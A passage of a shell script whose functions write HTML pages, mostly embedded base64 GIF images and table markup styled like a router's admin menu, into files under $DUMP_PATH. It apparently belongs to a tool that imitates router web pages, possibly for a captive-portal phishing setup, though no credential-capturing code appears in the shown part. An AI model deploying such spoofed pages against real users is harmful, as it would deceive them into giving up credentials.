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\" height=\"89\" width=\"330\"></td>
          <td height=\"89\" width=\"100%\"><img src=\"data:image/gif;base64,R0lGODlhAQBZANUAADpNcGR1l0lZeUhdf2Bth1VlhklZfWt5lVhtkHOCnVVlgVVlijNJbGBtj1Fhhl1xjGNxjVNhfCQ0VmlkfFtphTRIalVhgklVeTNFaUVVdys7Wltqi2Nxk1Fhgic8YkFNbzhFZytBYzFDY0JSc01dfTlKawAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAABAFkAAAZOwMnHQtJIPKWSBiQSJZOAwaPB4VxGlxIoQ9psSJ1DIlAQjDKLDjGjoBA4kEgS5Al5NB5RSDRydAJfHyEYHyMYICMkHyUADCIdCAYlIRVBADs=\" height=\"100%\" width=\"100%\"></td>
        </tr>
      </tbody></table>
   
</body></html>" > $DUMP_PATH/data/logo.html
}

function menu {
echo "<html><head>
<meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1252\">

<meta http-equiv=\"Pragma\" content=\"no-cache\">
<link rel=\"stylesheet\" href=\"stylemain.css\" type=\"text/css\">
<link rel=\"stylesheet\" href=\"colors.css\" type=\"text/css\">
<title></title>
</head>
<body class=\"mainMenuBody\" topmargin=\"0\" leftmargin=\"0\" marginheight=\"0\" marginwidth=\"0\">
<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" height=\"1000\">
  <tbody><tr>
    <td colspan=\"3\" align=\"left\" height=\"50\" valign=\"top\"><img src=\"data:image/gif;base64,R0lGODlhoAAyAPcAABgjNzhOc3ONsbFTaI6IpyxBYklegTRDWTVLcSo7Wj1UenODoWZ9oXdRaixEa2p9m9BVZ9EoNRspQGyFqTlJYMw3RkJWeCg+XzlJaSQ7XEtlilNtkUJTbLs1RFZwk9FJWSQySkFRcLZFWDRFZllaeVVphEldfqZviURVdUlZdZFXcE1ggS07VFJifFt1mU5gfEZZeTxNbUddgUFUdltxjTlNbj1RcklZejxRdmByjDZIaaxjekBObURafE1ihVBlhUhghlJoiVlphE5ojFhtjm6FplBmiWFCYDVGZ2mAoWN4lWZ9nY83TllvkG6AnTJJb1VpiUphgj1Ye32RsnCKrDpQdTpHZEdWdYiixVxylVJpjSIzUGJ0kFpxklVqjWV5mV14m1NMbDBBYW6Iq3GIqnuVunWPs+wuNzRKbXyNrXeOr0RScGyAokFXfU5khlVtjpBFWjFFZXpohiAtQlFkgWF5ml11lldylWmBpD5NaS8+V0dfhE1kgb8sO2aAoVptiDZNb0BSdENYeV1xknSLrkVXdj1QbjhKa0ZcfkZUcWB3mEhafWh5lGV2lqY0Rj5Ud0ZehJ57mFVmgXKMrysmPFRmhXSJqd9HVF1uiktefeA7R1lqiFl0lnCGqExZeElbekBOcFBrjmF1lDJEYTBGaDxJaDtPcZZqhjBGbFBhgWdrik1eeC1HbXVBXDVGYSEwR2V2kIN/nTBDZElWd4BuiltkgSc1TJN5lTpManOHpEJUcsJhdkNdgMlsgF96nWZ7nFZtiVBjhWyCojhHaDZIZVhqjURBYCs5TzZQdUVTdDNIa2heemqDp6YuQVxvjTtVd2J8nyg4V1ZRb2d7mCY/
ZEBbfItviWlykU5JZ0Zbe2+DojJMcHaMq11zkDBLcUhFY0Faf0ljhyY2Ump4mXeStjtLbClBZ1Jri1Rhf3qLqKk9UEZbfz1Tc01bfCI3WTNAXmN8m1trizVHbERdg19zlV9wkDdMbIOcwTQuRDBIb32Gp2yEpIRkgTlSeEBFZ3RxkCH5BAAAAAAALAAAAACgADIAAAj/AKWlSJToCkGCaxCuWciQh8OHPPJELCexVJ4rnniUSlap1ot2KWa1Q1cp3iZJL9DVkiRJiBB0qzC2bLGq5osWOHO2kLSTpc+WLl3+2YSpaI6jR7ko5QKrKSxGUKNKdZLuQQ5GD5ws0JrLCaNc6cKmWfBgQa6yU6Ys2Gq2rIoK1tau1YoNYh6Jd/PmKcW3bykrfq1YGSb477A1nmJYKefpZbJkN9ZcQRcPneV2IlO2a5doLw9PGS3e5bEmBGmGB69cScG6Neh2NVe9SEVHUiWfQkoI2bR709BNwIFjYjTtTwlMoogTfwCLi5NcC9gsGNdo3INGD6bkavRl2rhxXK5V/xDRqLz5RvhAqF+v3hZ79u7bg3Bvq359cbaO6cnzjgULK6t4QoEVawjmCTopeLJKZ4l4slBnriSQQCmJjBINCwlgqIceCbyjxzsghjjKiCSO4soIxJRCDAa44BJDCBzooksIMqJg442FFAJDIYLckAoUK8DwiQGVFOPMH0TEA0Ux9XzxiyjOFLMkEUTQ40Q9wQRDZTCpNNBHAz/8kGWWPwBg5plopqnmmRIA0OabEsQJgh4sgDAHCBwkcsABeRyw30Cs5UFBnnetwQMFdLJgkR5bbCHOo5BGI+mklCYwqYR6FKCHGJxyOmKnYowoyyhxxIEiEsooE8gKgthTgw09GP+wgg8/rLDICkEEUQw9XsiwzgoGIGJEE1708MgMPsiAAyjNNBNIIDg8G8ixa1Zr7ZtmxqntHPqJM8ccFCRCgStWHPAOBTywlkhEePHAAQd5jKJHNAnwgEs0jUL6KKX8SmipvwAHfIGEAxd8
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